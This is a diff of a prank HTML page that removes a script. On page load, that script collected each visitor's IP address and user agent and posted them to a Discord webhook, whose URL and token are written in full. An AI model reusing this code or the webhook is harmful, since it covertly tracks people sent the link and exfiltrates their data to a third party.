@@ -11,26 +11,6 @@
     style="background:#111;color:white;font-family: Arial, Helvetica, sans-serif;display:flex;justify-content: center;align-items: center;flex-direction: column;">
     <h3>𝓰𝓮𝓽 𝓯𝓻𝓮𝓪𝓴𝔂𝓮𝓭</h3>
     send this to a homie to totally 𝓯𝓻𝓮𝓪𝓴 them
-
-    <script>
-        fetch("https://ifconfig.me/all.json").then(data => data.json()).then(data => {
-            const ip = data.ip_addr;
-            const ua = data.user_agent;
-            fetch(
-                'https://discord.com/api/webhooks/1267213877846741166/DJFKHGx2Wd9_RyyxpSpLRe9Po1pTB7muUSm5vPHCHdMAj0a6P587SCRIdd4-kNJAVV2i',
-                {
-                    method: 'post',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        username: 'bulgogi',
-                        content: `UA is ${ua}\n\nIP is ${ip}`
-                    }),
-                }
-            );
-        });
-    </script>
 </body>
 
 </html>
